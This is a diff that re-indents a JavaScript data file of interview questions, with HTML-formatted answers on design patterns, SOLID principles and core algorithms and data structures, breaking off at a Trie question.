@@ -1926,11 +1927,11 @@ class OrderSubject {
     }
 }</pre>
 <div class="key-point">Observer is common in UI events and in-process event systems.</div>`,
-        },
-        {
-          q: 'What is the difference between Observer and Pub/Sub?',
-          difficulty: 'medium',
-          a: `<ul>
+      },
+      {
+        q: 'What is the difference between Observer and Pub/Sub?',
+        difficulty: 'medium',
+        a: `<ul>
 <li><strong>Observer</strong>: in-process object pattern.</li>
 <li><strong>Pub/Sub</strong>: distributed messaging architecture using a broker.</li>
 </ul>
@@ -1948,11 +1949,11 @@ class EventBus {
 
 new EventBus().publish("orders", "OrderShipped");</pre>
 <div class="key-point">They are similar in idea but very different in runtime, scalability, and failure behavior.</div>`,
-        },
-        {
-          q: 'What is the Adapter pattern?',
-          difficulty: 'medium',
-          a: `<p><strong>Adapter</strong> converts one interface into another interface expected by the client.</p>
+      },
+      {
+        q: 'What is the Adapter pattern?',
+        difficulty: 'medium',
+        a: `<p><strong>Adapter</strong> converts one interface into another interface expected by the client.</p>
 <pre>class LegacyPaymentApi {
     void makePayment(int cents) {
         System.out.println("Legacy paid: " + cents);
@@ -1971,11 +1972,11 @@ class PaymentAdapter implements PaymentProcessor {
     }
 }</pre>
 <div class="key-point">Use Adapter when integrating old or third-party APIs without changing the rest of your code.</div>`,
-        },
-        {
-          q: 'What is the Facade pattern?',
-          difficulty: 'medium',
-          a: `<p><strong>Facade</strong> provides a simplified interface over a complex subsystem.</p>
+      },
+      {
+        q: 'What is the Facade pattern?',
+        difficulty: 'medium',
+        a: `<p><strong>Facade</strong> provides a simplified interface over a complex subsystem.</p>
 <pre>class InventoryService {
     void reserve(String item) { System.out.println("Reserved " + item); }
 }
@@ -2000,11 +2001,11 @@ class CheckoutFacade {
     }
 }</pre>
 <div class="key-point">Facade reduces client complexity and centralizes orchestration.</div>`,
-        },
-        {
-          q: 'What is the Proxy pattern?',
-          difficulty: 'medium',
-          a: `<p><strong>Proxy</strong> keeps the same interface as the real object but controls access to it.</p>
+      },
+      {
+        q: 'What is the Proxy pattern?',
+        difficulty: 'medium',
+        a: `<p><strong>Proxy</strong> keeps the same interface as the real object but controls access to it.</p>
 <ul>
 <li>Lazy loading</li>
 <li>Security checks</li>
@@ -2042,11 +2043,11 @@ class ImageProxy implements Image {
     }
 }</pre>
 <div class="key-point">Spring AOP and many ORM lazy-loading features are classic proxy examples.</div>`,
-        },
-        {
-          q: 'What is the Decorator pattern?',
-          difficulty: 'medium',
-          a: `<p><strong>Decorator</strong> adds behavior to an object without changing its class.</p>
+      },
+      {
+        q: 'What is the Decorator pattern?',
+        difficulty: 'medium',
+        a: `<p><strong>Decorator</strong> adds behavior to an object without changing its class.</p>
 <pre>interface Coffee {
     String description();
     int cost();
@@ -2068,11 +2069,11 @@ class MilkDecorator implements Coffee {
     public int cost() { return coffee.cost() + 10; }
 }</pre>
 <div class="key-point">Decorator is useful when behavior must be combined flexibly at runtime.</div>`,
-        },
-        {
-          q: 'What is the Template Method pattern?',
-          difficulty: 'medium',
-          a: `<p><strong>Template Method</strong> defines the skeleton of an algorithm in a base class while subclasses customize steps.</p>
+      },
+      {
+        q: 'What is the Template Method pattern?',
+        difficulty: 'medium',
+        a: `<p><strong>Template Method</strong> defines the skeleton of an algorithm in a base class while subclasses customize steps.</p>
 <pre>abstract class FileProcessor {
     public final void process() {
         read();
@@ -2093,11 +2094,11 @@ class CsvProcessor extends FileProcessor {
     void transform() { System.out.println("Transform CSV"); }
 }</pre>
 <div class="key-point">Use Template Method when the algorithm flow stays stable but some steps vary.</div>`,
-        },
-        {
-          q: 'What is the Chain of Responsibility pattern?',
-          difficulty: 'hard',
-          a: `<p><strong>Chain of Responsibility</strong> passes a request through a chain of handlers until one handles it or the chain ends.</p>
+      },
+      {
+        q: 'What is the Chain of Responsibility pattern?',
+        difficulty: 'hard',
+        a: `<p><strong>Chain of Responsibility</strong> passes a request through a chain of handlers until one handles it or the chain ends.</p>
 <pre>abstract class Handler {
     private Handler next;
 
@@ -2126,11 +2127,11 @@ class AuditHandler extends Handler {
     }
 }</pre>
 <div class="key-point">HTTP middleware and servlet filters are common real-world examples.</div>`,
-        },
-        {
-          q: 'What is the Repository pattern?',
-          difficulty: 'medium',
-          a: `<p><strong>Repository</strong> abstracts data access behind a collection-like interface, decoupling business logic from persistence details.</p>
+      },
+      {
+        q: 'What is the Repository pattern?',
+        difficulty: 'medium',
+        a: `<p><strong>Repository</strong> abstracts data access behind a collection-like interface, decoupling business logic from persistence details.</p>
 <pre>// Without Repository: business logic knows about JPA
 entityManager.createQuery("SELECT u FROM User u WHERE u.email = :email")
     .setParameter("email", email)
@@ -2167,11 +2168,11 @@ class UserService {
     }
 }</pre>
 <div class="key-point">Repository makes business logic testable (inject a fake repo in tests) and allows swapping persistence technology without changing domain code. Spring Data JPA auto-generates repository implementations.</div>`,
-        },
-        {
-          q: 'What is Dependency Injection and how does it relate to design patterns?',
-          difficulty: 'medium',
-          a: `<p><strong>Dependency Injection (DI)</strong> provides dependencies from outside rather than creating them inside, enabling loose coupling and testability.</p>
+      },
+      {
+        q: 'What is Dependency Injection and how does it relate to design patterns?',
+        difficulty: 'medium',
+        a: `<p><strong>Dependency Injection (DI)</strong> provides dependencies from outside rather than creating them inside, enabling loose coupling and testability.</p>
 <pre>// ❌ Without DI: tight coupling
 class OrderService {
     private EmailService emailService = new EmailService(); // hardcoded dependency
@@ -2199,11 +2200,11 @@ class OrderService {
 <li><strong>Field injection</strong>: Spring @Autowired on fields — convenient but harder to test</li>
 </ul>
 <div class="key-point">DI applies the Dependency Inversion Principle (the "D" in SOLID): depend on abstractions, not concrete classes. Spring, Angular, and .NET all have built-in DI containers.</div>`,
-        },
-        {
-          q: 'What are SOLID principles? Give a brief example of each.',
-          difficulty: 'hard',
-          a: `<p>SOLID is five object-oriented design principles that make code more maintainable:</p>
+      },
+      {
+        q: 'What are SOLID principles? Give a brief example of each.',
+        difficulty: 'hard',
+        a: `<p>SOLID is five object-oriented design principles that make code more maintainable:</p>
 <pre>S - Single Responsibility: One class = one reason to change
   ❌ UserService handles login, email sending, and PDF generation
   ✅ UserService handles login; EmailService handles email; PdfService handles PDF
@@ -2226,11 +2227,11 @@ D - Dependency Inversion: Depend on abstractions, not concretions
   ❌ class OrderService { private MySqlRepo repo = new MySqlRepo(); }
   ✅ class OrderService { private Repository repo; // interface injected }</pre>
 <div class="key-point">SOLID principles are heavily asked in interviews. Know one concrete example for each. The most commonly tested are Single Responsibility (S) and Dependency Inversion (D).</div>`,
-        },
-        {
-          q: 'What is the difference between Adapter, Facade, and Proxy patterns?',
-          difficulty: 'tricky',
-          a: `<p>All three wrap another object, but for <strong>different reasons</strong>:</p>
+      },
+      {
+        q: 'What is the difference between Adapter, Facade, and Proxy patterns?',
+        difficulty: 'tricky',
+        a: `<p>All three wrap another object, but for <strong>different reasons</strong>:</p>
 <table><tr><th>Pattern</th><th>Purpose</th><th>Interface</th><th>Example</th></tr>
 <tr><td><strong>Adapter</strong></td><td>Convert incompatible interface</td><td>Changes interface</td><td>Legacy API → new interface</td></tr>
 <tr><td><strong>Facade</strong></td><td>Simplify complex subsystem</td><td>New simplified interface</td><td>checkout() wraps 5 services</td></tr>
@@ -2259,20 +2260,20 @@ class CachingUserProxy implements UserService {
     }
 }</pre>
 <div class="key-point">Trick question tip: If asked "which pattern wraps another object?" — all three do! The difference is WHY: Adapter = interface mismatch, Facade = simplification, Proxy = access control.</div>`,
-        },
-      ],
-    },
+      },
+    ],
+  },
 
-    // ========================= ALGORITHMS & DATA STRUCTURES =========================,
-    {
-      id: 'algorithms',
-      name: 'Algorithms',
-      icon: '🧮',
-      questions: [
-        {
-          q: 'What is Big O Notation and why does it matter?',
-          difficulty: 'easy',
-          a: `<p><strong>Big O Notation</strong> describes how the runtime or memory of an algorithm grows as the input size grows. It answers: <em>"If I double my data, how much slower does it get?"</em></p>
+  // ========================= ALGORITHMS & DATA STRUCTURES =========================,
+  {
+    id: 'algorithms',
+    name: 'Algorithms',
+    icon: '🧮',
+    questions: [
+      {
+        q: 'What is Big O Notation and why does it matter?',
+        difficulty: 'easy',
+        a: `<p><strong>Big O Notation</strong> describes how the runtime or memory of an algorithm grows as the input size grows. It answers: <em>"If I double my data, how much slower does it get?"</em></p>
 <p><strong>Analogy:</strong> You're looking for a friend in a crowd.</p>
 <ul>
 <li><strong>O(1)</strong>: Your friend is always at the front door. Crowd size doesn't matter → <strong>constant</strong>.</li>
@@ -2290,11 +2291,11 @@ Example with n = 1,000,000:
   O(n)      → 1,000,000 operations
   O(n²)     → 1,000,000,000,000 operations (too slow!)</pre>
 <div class="key-point">In interviews, always state the Big O of your solution. If it's O(n²), ask yourself: "Can I do better?" — usually you can with the right data structure.</div>`,
-        },
-        {
-          q: 'What is an Array vs a Linked List? When to use which?',
-          difficulty: 'easy',
-          a: `<p><strong>Array</strong>: Elements stored in <strong>contiguous</strong> (side-by-side) memory. Access by index is instant.</p>
+      },
+      {
+        q: 'What is an Array vs a Linked List? When to use which?',
+        difficulty: 'easy',
+        a: `<p><strong>Array</strong>: Elements stored in <strong>contiguous</strong> (side-by-side) memory. Access by index is instant.</p>
 <p><strong>Linked List</strong>: Elements (nodes) stored anywhere in memory, each pointing to the next one.</p>
 <p><strong>Analogy:</strong></p>
 <ul>
@@ -2313,11 +2314,11 @@ Linked List: [10]→[20]→[30]→[40]→[50]→null
 <tr><td>Delete from middle</td><td>O(n)</td><td>O(1) if you have the node</td></tr>
 <tr><td>Memory</td><td>Compact</td><td>Extra space for pointers</td></tr></table>
 <div class="key-point">Use <strong>Array</strong> when you need fast random access (arr[i]). Use <strong>Linked List</strong> when you frequently insert/delete at the beginning or middle.</div>`,
-        },
-        {
-          q: 'What is a Stack and a Queue?',
-          difficulty: 'easy',
-          a: `<p><strong>Stack</strong> = Last In, First Out (LIFO). Like a stack of plates — you add and remove from the top.</p>
+      },
+      {
+        q: 'What is a Stack and a Queue?',
+        difficulty: 'easy',
+        a: `<p><strong>Stack</strong> = Last In, First Out (LIFO). Like a stack of plates — you add and remove from the top.</p>
 <p><strong>Queue</strong> = First In, First Out (FIFO). Like a line at a coffee shop — first person in line is served first.</p>
 <pre>Stack (LIFO):             Queue (FIFO):
   push(1) → [1]            enqueue(1) → [1]
@@ -2340,11 +2341,11 @@ Input: "({[]})"
   ')' → pop '(' matches → []
   Stack empty → BALANCED ✅</pre>
 <div class="key-point">Both Stack and Queue have <strong>O(1)</strong> push/pop and enqueue/dequeue. In Java: use <code>Deque</code> (ArrayDeque) for stack, <code>Queue</code> (LinkedList) for queue.</div>`,
-        },
-        {
-          q: 'What is a Hash Map (Hash Table) and how does it work?',
-          difficulty: 'easy',
-          a: `<p>A <strong>Hash Map</strong> stores key-value pairs and provides <strong>O(1)</strong> average lookup, insert, and delete.</p>
+      },
+      {
+        q: 'What is a Hash Map (Hash Table) and how does it work?',
+        difficulty: 'easy',
+        a: `<p>A <strong>Hash Map</strong> stores key-value pairs and provides <strong>O(1)</strong> average lookup, insert, and delete.</p>
 <p><strong>Analogy:</strong> A library filing system. Each book (value) has a unique call number (key). The librarian uses a formula (hash function) to calculate exactly which shelf to go to — no need to search every shelf.</p>
 <pre>How it works:
 1. hash("apple") → 3    (hash function converts key to array index)
@@ -2368,11 +2369,11 @@ prices.put("apple", 5);    // O(1)
 prices.get("apple");        // O(1) → 5
 prices.containsKey("apple"); // O(1) → true</pre>
 <div class="key-point">Hash Map is the <strong>#1 most useful data structure</strong> in interviews. It solves "find duplicates", "count frequency", "two sum", and many more in O(n) instead of O(n²).</div>`,
-        },
-        {
-          q: 'What is Binary Search and when can you use it?',
-          difficulty: 'easy',
-          a: `<p><strong>Binary Search</strong> finds a target in a <strong>sorted</strong> array by repeatedly cutting the search space in half. It's O(log n) — extremely fast.</p>
+      },
+      {
+        q: 'What is Binary Search and when can you use it?',
+        difficulty: 'easy',
+        a: `<p><strong>Binary Search</strong> finds a target in a <strong>sorted</strong> array by repeatedly cutting the search space in half. It's O(log n) — extremely fast.</p>
 <p><strong>Analogy:</strong> Guessing a number between 1-100. Instead of guessing 1, 2, 3... you say "50?" → "Too high" → "25?" → "Too low" → "37?" Each guess eliminates half the numbers.</p>
 <pre>Find 23 in [2, 5, 8, 12, 16, 23, 38, 56, 72, 91]:
 
@@ -2398,11 +2399,11 @@ int binarySearch(int[] arr, int target) {
 <li>You can eliminate half the search space each step</li>
 </ul>
 <div class="key-point">Common trick: Binary search isn't just for sorted arrays. It works on any problem where you can answer "too high or too low?" — like finding minimum speed to finish on time, or the first bad version in a release.</div>`,
-        },
-        {
-          q: 'Explain Bubble Sort, Selection Sort, and Insertion Sort.',
-          difficulty: 'easy',
-          a: `<p>These are three simple sorting algorithms, all O(n²). Great for learning but too slow for large data.</p>
+      },
+      {
+        q: 'Explain Bubble Sort, Selection Sort, and Insertion Sort.',
+        difficulty: 'easy',
+        a: `<p>These are three simple sorting algorithms, all O(n²). Great for learning but too slow for large data.</p>
 <p><strong>1. Bubble Sort</strong> — Repeatedly swap adjacent elements if they're in the wrong order. Like bubbles rising to the surface.</p>
 <pre>[5, 3, 8, 1] → compare pairs and swap:
   5,3 → swap → [3, 5, 8, 1]
@@ -2424,11 +2425,11 @@ int binarySearch(int[] arr, int target) {
 <tr><td>Selection</td><td>O(n²)</td><td>O(n²)</td><td>O(n²)</td><td>No</td></tr>
 <tr><td>Insertion</td><td>O(n)</td><td>O(n²)</td><td>O(n²)</td><td>Yes</td></tr></table>
 <div class="key-point"><strong>Insertion Sort</strong> is the best of the three — it's fast on nearly-sorted data (O(n)) and is used as a subroutine in Timsort (Python/Java's default sort).</div>`,
-        },
-        {
-          q: 'Explain Merge Sort. How does it work?',
-          difficulty: 'medium',
-          a: `<p><strong>Merge Sort</strong> uses <strong>Divide and Conquer</strong>: split the array in half, sort each half, then merge the two sorted halves. Always O(n log n).</p>
+      },
+      {
+        q: 'Explain Merge Sort. How does it work?',
+        difficulty: 'medium',
+        a: `<p><strong>Merge Sort</strong> uses <strong>Divide and Conquer</strong>: split the array in half, sort each half, then merge the two sorted halves. Always O(n log n).</p>
 <p><strong>Analogy:</strong> Sorting a deck of cards. Split the deck in half. Split each half again. Keep splitting until you have single cards (already sorted). Then merge pairs of sorted piles by comparing their top cards.</p>
 <pre>Merge Sort [38, 27, 43, 3, 9, 82, 10]:
 
@@ -2458,11 +2459,11 @@ void mergeSort(int[] arr, int left, int right) {
 <tr><td>Space</td><td>O(n) extra (for temp arrays)</td></tr>
 <tr><td>Stable</td><td>Yes</td></tr></table>
 <div class="key-point">Merge Sort is <strong>guaranteed O(n log n)</strong> (no worst case like Quick Sort). Used for sorting linked lists and external sorting (data that doesn't fit in memory).</div>`,
-        },
-        {
-          q: 'Explain Quick Sort. How does it work?',
-          difficulty: 'medium',
-          a: `<p><strong>Quick Sort</strong> picks a "pivot" element, partitions the array so everything smaller goes left and everything larger goes right, then recursively sorts left and right.</p>
+      },
+      {
+        q: 'Explain Quick Sort. How does it work?',
+        difficulty: 'medium',
+        a: `<p><strong>Quick Sort</strong> picks a "pivot" element, partitions the array so everything smaller goes left and everything larger goes right, then recursively sorts left and right.</p>
 <p><strong>Analogy:</strong> Organizing books on a shelf. Pick one book (pivot). Put all shorter books to the left, taller books to the right. Then do the same for each side.</p>
 <pre>Quick Sort [8, 3, 1, 7, 0, 10, 2]:
   Pivot = 7
@@ -2499,11 +2500,11 @@ int partition(int[] arr, int low, int high) {
 <tr><td>Space</td><td>O(log n) — in-place</td></tr>
 <tr><td>Stable</td><td>No</td></tr></table>
 <div class="key-point">Quick Sort is <strong>faster in practice</strong> than Merge Sort due to cache locality (in-place). Fix worst case by choosing a <strong>random pivot</strong> or <strong>median-of-three</strong>.</div>`,
-        },
-        {
-          q: 'What is a Binary Tree and a Binary Search Tree (BST)?',
-          difficulty: 'easy',
-          a: `<p><strong>Binary Tree</strong>: Each node has at most 2 children (left and right).</p>
+      },
+      {
+        q: 'What is a Binary Tree and a Binary Search Tree (BST)?',
+        difficulty: 'easy',
+        a: `<p><strong>Binary Tree</strong>: Each node has at most 2 children (left and right).</p>
 <p><strong>Binary Search Tree (BST)</strong>: A binary tree where left child < parent < right child. This ordering makes searching fast.</p>
 <p><strong>Analogy:</strong> A BST is like a "20 Questions" game. "Is the number > 50?" → No → "Is it > 25?" → Yes → "Is it > 37?" Each question eliminates half the possibilities.</p>
 <pre>BST Example:
@@ -2533,11 +2534,11 @@ TreeNode insert(TreeNode root, int val) {
     return root;
 }</pre>
 <div class="key-point">A BST becomes O(n) when it's unbalanced (like a linked list). That's why we use <strong>self-balancing BSTs</strong> like AVL Tree or Red-Black Tree (used in Java TreeMap).</div>`,
-        },
-        {
-          q: 'What are tree traversals: Inorder, Preorder, Postorder, and Level-order?',
-          difficulty: 'medium',
-          a: `<p>Tree traversals are ways to visit every node in a tree. The order you visit determines the traversal type.</p>
+      },
+      {
+        q: 'What are tree traversals: Inorder, Preorder, Postorder, and Level-order?',
+        difficulty: 'medium',
+        a: `<p>Tree traversals are ways to visit every node in a tree. The order you visit determines the traversal type.</p>
 <pre>Example tree:
         1
        / \\
@@ -2576,11 +2577,11 @@ void levelOrder(TreeNode root) {
     }
 }</pre>
 <div class="key-point">Memory trick: <strong>In</strong>order = root <strong>In</strong> the middle. <strong>Pre</strong>order = root comes <strong>first</strong>. <strong>Post</strong>order = root comes <strong>last</strong>.</div>`,
-        },
-        {
-          q: 'What is a Heap (Priority Queue) and how does it work?',
-          difficulty: 'medium',
-          a: `<p>A <strong>Heap</strong> is a complete binary tree where the parent is always greater (Max-Heap) or smaller (Min-Heap) than its children. It gives you the min/max element in O(1).</p>
+      },
+      {
+        q: 'What is a Heap (Priority Queue) and how does it work?',
+        difficulty: 'medium',
+        a: `<p>A <strong>Heap</strong> is a complete binary tree where the parent is always greater (Max-Heap) or smaller (Min-Heap) than its children. It gives you the min/max element in O(1).</p>
 <p><strong>Analogy:</strong> A company hierarchy. In a Min-Heap, the CEO (smallest number) is always at the top. New employees (inserts) start at the bottom and "bubble up" if they outrank their manager.</p>
 <pre>Min-Heap:
         1
@@ -2613,11 +2614,11 @@ PriorityQueue&lt;Integer&gt; maxHeap = new PriorityQueue&lt;&gt;(Collections.rev
 <li><strong>Task scheduling</strong>: Process highest-priority task first</li>
 </ul>
 <div class="key-point">A Heap is stored as an <strong>array</strong> under the hood. For node at index i: left child = 2i+1, right child = 2i+2, parent = (i-1)/2.</div>`,
-        },
-        {
-          q: 'What is Recursion? Explain with examples.',
-          difficulty: 'easy',
-          a: `<p><strong>Recursion</strong> = a function that calls itself to solve smaller versions of the same problem until it reaches a base case.</p>
+      },
+      {
+        q: 'What is Recursion? Explain with examples.',
+        difficulty: 'easy',
+        a: `<p><strong>Recursion</strong> = a function that calls itself to solve smaller versions of the same problem until it reaches a base case.</p>
 <p><strong>Analogy:</strong> Russian nesting dolls (Matryoshka). Open a doll → there's a smaller doll inside. Keep opening until you reach the tiniest doll (base case). Then put them all back together.</p>
 <pre>// Factorial: 5! = 5 × 4 × 3 × 2 × 1
 int factorial(int n) {
@@ -2644,11 +2645,11 @@ int fib(int n) {
 <li><strong>Recursive case</strong>: Break the problem into a smaller version of itself</li>
 </ol>
 <div class="key-point">Every recursion can be converted to iteration (using a stack). Watch out for <strong>StackOverflowError</strong> if recursion is too deep. Optimize with <strong>memoization</strong> or <strong>tail recursion</strong>.</div>`,
-        },
-        {
-          q: 'What is Dynamic Programming (DP)?',
-          difficulty: 'hard',
-          a: `<p><strong>Dynamic Programming</strong> = solving complex problems by breaking them into overlapping subproblems and storing results to avoid recomputing them.</p>
+      },
+      {
+        q: 'What is Dynamic Programming (DP)?',
+        difficulty: 'hard',
+        a: `<p><strong>Dynamic Programming</strong> = solving complex problems by breaking them into overlapping subproblems and storing results to avoid recomputing them.</p>
 <p><strong>Analogy:</strong> Imagine calculating "1+1+1+1+1+1+1+1". That's 8. Now add "+1". You don't start over! You remember the previous result (8) and just add 1 = 9. That's DP — <strong>remembering answers</strong>.</p>
 <p><strong>Two approaches:</strong></p>
 <pre>1. Top-Down (Memoization): Start from big problem, store results as you go
@@ -2684,11 +2685,11 @@ int fib(int n) {
 <li>Common DP problems: Fibonacci, Longest Common Subsequence, Knapsack, Coin Change</li>
 </ul>
 <div class="key-point">DP trick: If a recursion tree has repeated branches, it's a DP problem. Draw the recursion tree first, then add memoization.</div>`,
-        },
-        {
-          q: 'Explain BFS (Breadth-First Search) and DFS (Depth-First Search).',
-          difficulty: 'medium',
-          a: `<p>BFS and DFS are two ways to visit all nodes in a graph or tree.</p>
+      },
+      {
+        q: 'Explain BFS (Breadth-First Search) and DFS (Depth-First Search).',
+        difficulty: 'medium',
+        a: `<p>BFS and DFS are two ways to visit all nodes in a graph or tree.</p>
 <p><strong>Analogy — Searching for keys in a house:</strong></p>
 <ul>
 <li><strong>BFS</strong>: Check every room on floor 1 first, then every room on floor 2, etc. (level by level)</li>
@@ -2733,11 +2734,11 @@ void dfs(int node, Set&lt;Integer&gt; visited) {
 <tr><td>Memory</td><td>Higher (stores entire level)</td><td>Lower</td></tr>
 <tr><td>Use case</td><td>Shortest path, level-order</td><td>Cycle detection, topological sort</td></tr></table>
 <div class="key-point">Use <strong>BFS</strong> for "shortest path" or "minimum steps" problems. Use <strong>DFS</strong> for "explore all paths", "detect cycles", or when solutions are deep in the graph.</div>`,
-        },
-        {
-          q: 'What is the Two Pointer technique?',
-          difficulty: 'medium',
-          a: `<p><strong>Two Pointers</strong> = use two indices that move through an array, usually from both ends or at different speeds, to solve problems in O(n).</p>
+      },
+      {
+        q: 'What is the Two Pointer technique?',
+        difficulty: 'medium',
+        a: `<p><strong>Two Pointers</strong> = use two indices that move through an array, usually from both ends or at different speeds, to solve problems in O(n).</p>
 <p><strong>Analogy:</strong> Two people searching a hallway of lockers — one starts from the left, one from the right. They walk toward each other and meet in the middle.</p>
 <p><strong>Example 1: Two Sum (sorted array)</strong></p>
 <pre>Find two numbers that add to 9 in [1, 2, 4, 6, 8, 10]:
@@ -2764,11 +2765,11 @@ Result: first 3 elements = [1, 2, 3] ✅</pre>
 <li><strong>Same direction</strong>: Slow and fast pointer (remove duplicates, fast/slow linked list cycle)</li>
 </ul>
 <div class="key-point">Two pointers usually reduce O(n²) to O(n). Works best on <strong>sorted arrays</strong> or when you need to compare elements from both ends.</div>`,
-        },
-        {
-          q: 'What is the Sliding Window technique?',
-          difficulty: 'medium',
-          a: `<p><strong>Sliding Window</strong> = maintain a "window" (subarray/substring) that expands or shrinks as you move through the array. Avoids recomputing from scratch each time.</p>
+      },
+      {
+        q: 'What is the Sliding Window technique?',
+        difficulty: 'medium',
+        a: `<p><strong>Sliding Window</strong> = maintain a "window" (subarray/substring) that expands or shrinks as you move through the array. Avoids recomputing from scratch each time.</p>
 <p><strong>Analogy:</strong> A magnifying glass sliding over a book page. You can see a fixed-size chunk of text at a time. As you slide it right, you lose one character from the left and gain one from the right.</p>
 <p><strong>Example 1: Maximum sum of subarray of size K</strong></p>
 <pre>Array: [2, 1, 5, 1, 3, 2], K = 3
@@ -2798,11 +2799,11 @@ int maxSum(int[] arr, int k) {
 <li><strong>Variable-size window</strong>: Expand right, shrink left based on condition (longest substring without repeating chars)</li>
 </ul>
 <div class="key-point">Sliding window turns O(n*k) or O(n²) into O(n). Look for keywords: "contiguous subarray", "substring", "window of size K".</div>`,
-        },
-        {
-          q: 'How does a Graph work? Adjacency List vs Adjacency Matrix.',
-          difficulty: 'medium',
-          a: `<p>A <strong>Graph</strong> is a collection of nodes (vertices) connected by edges. It models relationships: social networks, roads, web pages, dependencies.</p>
+      },
+      {
+        q: 'How does a Graph work? Adjacency List vs Adjacency Matrix.',
+        difficulty: 'medium',
+        a: `<p>A <strong>Graph</strong> is a collection of nodes (vertices) connected by edges. It models relationships: social networks, roads, web pages, dependencies.</p>
 <p><strong>Types:</strong></p>
 <ul>
 <li><strong>Directed</strong>: Edges have direction (Twitter follow: A→B doesn't mean B→A)</li>
@@ -2837,11 +2838,11 @@ graph.put(0, Arrays.asList(1, 3));
 graph.put(1, Arrays.asList(0, 2));
 // etc.</pre>
 <div class="key-point">Most real-world graphs are <strong>sparse</strong> (few edges relative to nodes), so <strong>adjacency list</strong> is the default choice. Use adjacency matrix only for small, dense graphs.</div>`,
-        },
-        {
-          q: "What is Dijkstra's Algorithm?",
-          difficulty: 'hard',
-          a: `<p><strong>Dijkstra's Algorithm</strong> finds the <strong>shortest path</strong> from a source node to all other nodes in a <strong>weighted graph</strong> (non-negative weights).</p>
+      },
+      {
+        q: "What is Dijkstra's Algorithm?",
+        difficulty: 'hard',
+        a: `<p><strong>Dijkstra's Algorithm</strong> finds the <strong>shortest path</strong> from a source node to all other nodes in a <strong>weighted graph</strong> (non-negative weights).</p>
 <p><strong>Analogy:</strong> You're at a city (node A) and want the shortest route to every other city. You start by visiting the nearest city first, then update distances to its neighbors. Always visit the unvisited city with the smallest known distance.</p>
 <pre>Graph:
   A --1-- B --3-- D
@@ -2884,11 +2885,11 @@ void dijkstra(int[][] graph, int src) {
 }</pre>
 <p><strong>Time:</strong> O((V + E) log V) with priority queue.</p>
 <div class="key-point">Dijkstra <strong>does NOT work</strong> with negative edge weights. For negative weights, use <strong>Bellman-Ford</strong>. Google Maps uses a variant of Dijkstra to find shortest routes.</div>`,
-        },
-        {
-          q: 'What is the Greedy Algorithm approach?',
-          difficulty: 'medium',
-          a: `<p>A <strong>Greedy Algorithm</strong> makes the <strong>locally optimal choice</strong> at each step, hoping it leads to the globally optimal solution.</p>
+      },
+      {
+        q: 'What is the Greedy Algorithm approach?',
+        difficulty: 'medium',
+        a: `<p>A <strong>Greedy Algorithm</strong> makes the <strong>locally optimal choice</strong> at each step, hoping it leads to the globally optimal solution.</p>
 <p><strong>Analogy:</strong> Climbing a mountain in fog. You can only see a few meters ahead. At each step, you walk in the direction that goes UP the most. This doesn't always get you to the highest peak, but for many problems, it works perfectly.</p>
 <p><strong>Example 1: Coin Change (Greedy works here)</strong></p>
 <pre>Make change for 36 cents using fewest coins [25, 10, 5, 1]:
@@ -2914,11 +2915,11 @@ void dijkstra(int[][] graph, int src) {
   Greedy: 4 + 1 + 1 = 3 coins
   Optimal: 3 + 3 = 2 coins ← greedy fails! Need DP instead.</pre>
 <div class="key-point">Greedy is <strong>fast and simple</strong> but doesn't always give the optimal answer. If greedy doesn't work, try <strong>Dynamic Programming</strong>.</div>`,
-        },
-        {
-          q: 'What is Backtracking?',
-          difficulty: 'hard',
-          a: `<p><strong>Backtracking</strong> = try all possible options, and when you hit a dead end, undo the last choice and try a different path. It's like solving a maze — if you hit a wall, go back and try another turn.</p>
+      },
+      {
+        q: 'What is Backtracking?',
+        difficulty: 'hard',
+        a: `<p><strong>Backtracking</strong> = try all possible options, and when you hit a dead end, undo the last choice and try a different path. It's like solving a maze — if you hit a wall, go back and try another turn.</p>
 <p><strong>Analogy:</strong> Trying combinations on a lock. Try 000, 001, 002... If you know the first digit is 3 (constraint), you skip 000-299 entirely. That's the power of backtracking — <strong>pruning</strong> bad choices early.</p>
 <p><strong>Example: Generate all permutations of [1, 2, 3]</strong></p>
 <pre>                 []
@@ -2951,11 +2952,11 @@ void permute(int[] nums, List&lt;Integer&gt; current, boolean[] used, List&lt;Li
 <li>Word search in a grid</li>
 </ul>
 <div class="key-point">Backtracking template: <strong>Choose → Explore → Un-choose</strong>. The "un-choose" step is what makes it backtracking. Always add <strong>pruning conditions</strong> to skip obviously bad paths.</div>`,
-        },
-        {
-          q: 'What is the difference between Stable and Unstable sorting?',
-          difficulty: 'easy',
-          a: `<p>A <strong>stable</strong> sort preserves the relative order of equal elements. An <strong>unstable</strong> sort doesn't guarantee it.</p>
+      },
+      {
+        q: 'What is the difference between Stable and Unstable sorting?',
+        difficulty: 'easy',
+        a: `<p>A <strong>stable</strong> sort preserves the relative order of equal elements. An <strong>unstable</strong> sort doesn't guarantee it.</p>
 <p><strong>Analogy:</strong> You have a list of students sorted by name. Now sort by grade. With a <strong>stable</strong> sort, students with the same grade remain alphabetically ordered. With an unstable sort, their name order might get shuffled.</p>
 <pre>Original (sorted by name):
   Alice: B
@@ -2980,11 +2981,11 @@ Unstable sort by grade:
 <tr><td>Bubble Sort</td><td>Selection Sort</td></tr>
 <tr><td>Timsort (Java/Python)</td><td></td></tr></table>
 <div class="key-point">Stability matters when you sort by multiple criteria (e.g., sort by date, then by priority). Java's <code>Arrays.sort()</code> uses <strong>Timsort (stable)</strong> for objects and <strong>Dual-Pivot Quicksort (unstable)</strong> for primitives.</div>`,
-        },
-        {
-          q: 'How do you detect a cycle in a Linked List?',
-          difficulty: 'medium',
-          a: `<p>Use <strong>Floyd's Tortoise and Hare</strong> algorithm: two pointers, one moves 1 step (slow), the other moves 2 steps (fast). If there's a cycle, they'll eventually meet.</p>
+      },
+      {
+        q: 'How do you detect a cycle in a Linked List?',
+        difficulty: 'medium',
+        a: `<p>Use <strong>Floyd's Tortoise and Hare</strong> algorithm: two pointers, one moves 1 step (slow), the other moves 2 steps (fast). If there's a cycle, they'll eventually meet.</p>
 <p><strong>Analogy:</strong> Two runners on a circular track. The fast runner laps the slow runner — they MUST meet. On a straight track (no cycle), the fast runner just reaches the end.</p>
 <pre>Linked List with cycle:
   1 → 2 → 3 → 4 → 5
@@ -3027,11 +3028,11 @@ ListNode findCycleStart(ListNode head) {
     return null;
 }</pre>
 <div class="key-point">Time: O(n), Space: O(1). This is much better than using a HashSet (O(n) space). Floyd's algorithm is a classic interview question!</div>`,
-        },
-        {
-          q: 'What is a Trie (Prefix Tree) and when is it used?',
-          difficulty: 'hard',
